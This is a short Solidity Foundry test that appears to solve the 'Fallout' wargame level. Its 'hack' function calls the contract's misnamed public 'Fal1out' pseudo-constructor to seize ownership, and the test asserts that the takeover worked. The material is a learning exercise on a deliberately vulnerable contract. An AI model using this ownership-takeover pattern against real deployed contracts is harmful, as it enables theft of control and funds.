// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Fallout} from "../src/2.Fallout.sol";
contract FalloutHackTest is Test{
    Fallout fallout;
    function setUp() public {
        fallout = new Fallout();
    }
    function hack() internal {
        fallout.Fal1out();
    }
    function testFalloutHack() public {
        hack();
        assertEq(fallout.owner(), address(this));
    }
}